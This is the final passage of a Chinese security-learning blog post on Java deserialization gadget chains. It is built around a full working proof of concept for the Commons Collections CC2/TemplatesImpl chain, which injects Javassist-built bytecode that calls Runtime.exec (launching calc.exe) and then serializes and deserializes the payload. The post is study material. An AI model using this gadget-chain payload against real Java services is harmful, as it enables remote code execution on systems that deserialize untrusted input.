<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519013700056.png" alt="image-20230519013700056"></p>
<p>这里，会使用到我们之前得到的<code>_transletIndex</code>就会完成<code>newInstance()</code>，随后即可调用static方法中的函数了。</p>
<p>也就是说，需要上述两个条件，是为了满足父类的要求，设置_transletIndex，然后完成newInstance()。</p>
<h3 id="TemplatesImpl链POC："><a href="#TemplatesImpl链POC：" class="headerlink" title="TemplatesImpl链POC："></a>TemplatesImpl链POC：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//反射,设置comparator,InvokerTransformer中方法为newTransformer</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(queue, comparator);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> InvokerTransformer.class.getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">            field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field1.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//创建类字节码和恶意指令</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">poc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Poc&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;C:\\\\Windows\\\\WinSxS\\\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\\\calc.exe\&quot;);&quot;</span>;</span><br><span class="line">            poc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">            <span class="type">String</span> <span class="variable">RandName</span> <span class="operator">=</span> <span class="string">&quot;POC&quot;</span>+System.nanoTime();</span><br><span class="line">            poc.setName(RandName);</span><br><span class="line">            poc.setSuperclass(pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName()));</span><br><span class="line">            <span class="type">byte</span>[] classbyte = poc.toBytecode();</span><br><span class="line">            <span class="type">byte</span>[][] trueclassbyte = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">            <span class="comment">//反射设置值</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">            field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field2.set(templates,trueclassbyte);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">            field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field3.set(templates,<span class="string">&quot;Ho1L0w-By&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">            field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field4.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException | NotFoundException | IOException | ClassNotFoundException |</span><br><span class="line">                 NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field5</span> <span class="operator">=</span> java.util.PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        field5.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field5.set(queue,queueArray);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519171946357.png" alt="image-20230519171946357"></p>
<p>这个POC写的有点长，主要是因为我没有专门写一个反射用函数，这里每次反射都是手来的，下次加上。</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>很有趣的一次跟链子，感觉Java这个动态加载字节码的做法，给了它这种强类型语言不匹配的灵活性，非常爽。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://Ho1L0w-By.github.io">Ho1L0w-By</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ho1l0w-by.github.io/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/">https://ho1l0w-by.github.io/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Ho1L0w-By.github.io" target="_blank">Ho1L0w-By's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="/img/background.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/"><img class="prev-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CC链学习下</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/"><img class="next-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CC链学习上</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">CC链学习上</div></div></a></div><div><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">CC链学习下</div></div></a></div><div><a href="/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/" title="Smartbi系列漏洞详解"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">Smartbi系列漏洞详解</div></div></a></div><div><a href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">URLDNS与ysoserial简单使用</div></div></a></div><div><a href="/2023/09/21/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">JNDI注入</div></div></a></div><div><a href="/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-25</div><div class="title">Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/Myhead.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ho1L0w-By</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Ho1L0w-By"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Ho1L0w-By" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1691834629@qq.com" target="_blank" title="Email"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">主攻Web安全，D0g3成员 QQ:1691834629</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">CC链学习中：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">CC2：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">调用链：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PriorityQueue-class"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">PriorityQueue.class:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformingComparator-class"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">TransformingComparator.class:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#readObejct"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">readObejct():</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#heapify"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">heapify():</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#siftDown"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">siftDown():</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#compare-%EF%BC%9A"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">compare()：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E7%89%88POC"><span class="toc-number">1.2.3.</span> <span class="toc-text">初版POC:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%90%8EPOC"><span class="toc-number">1.2.4.</span> <span class="toc-text">修改后POC:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F2%EF%BC%9A"><span class="toc-number">1.2.5.</span> <span class="toc-text">调用方式2：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E4%B8%AD%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">Java中动态加载字节码：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJava%E7%9A%84%E2%80%9C%E5%AD%97%E8%8A%82%E7%A0%81%E2%80%9D%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">什么是Java的“字节码”：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8URLClassLoader%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BClass%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用URLClassLoader加载远程Class文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-ClassLoader-defineClass-%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%9A"><span class="toc-number">1.3.3.</span> <span class="toc-text">利用 ClassLoader#defineClass 直接加载字节码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%9A"><span class="toc-number">1.3.4.</span> <span class="toc-text">利用TemplatesImpl加载字节码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Javassit%E5%BA%93%EF%BC%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text">Javassit库：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ClassPool"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">ClassPool:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CtClass%EF%BC%9A"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">CtClass：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F2%E7%9A%84TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.3.6.</span> <span class="toc-text">关于调用方式2的TemplatesImpl利用链分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl%E9%93%BEPOC%EF%BC%9A"><span class="toc-number">1.3.7.</span> <span class="toc-text">TemplatesImpl链POC：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JNDI注入"/></a><div class="content"><a class="title" href="/2023/09/21/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入">JNDI注入</a><time datetime="2023-09-21T12:52:45.000Z" title="发表于 2023-09-21 20:52:45">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习下"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下">CC链学习下</a><time datetime="2023-09-21T10:15:23.000Z" title="发表于 2023-09-21 18:15:23">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/" title="CC链学习中"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习中"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/" title="CC链学习中">CC链学习中</a><time datetime="2023-09-21T10:15:10.000Z" title="发表于 2023-09-21 18:15:10">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习上"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上">CC链学习上</a><time datetime="2023-09-21T10:15:02.000Z" title="发表于 2023-09-21 18:15:02">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS与ysoserial简单使用"/></a><div class="content"><a class="title" href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用">URLDNS与ysoserial简单使用</a><time datetime="2023-09-21T10:08:59.000Z" title="发表于 2023-09-21 18:08:59">2023-09-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ho1L0w-By</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hack For Fun</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>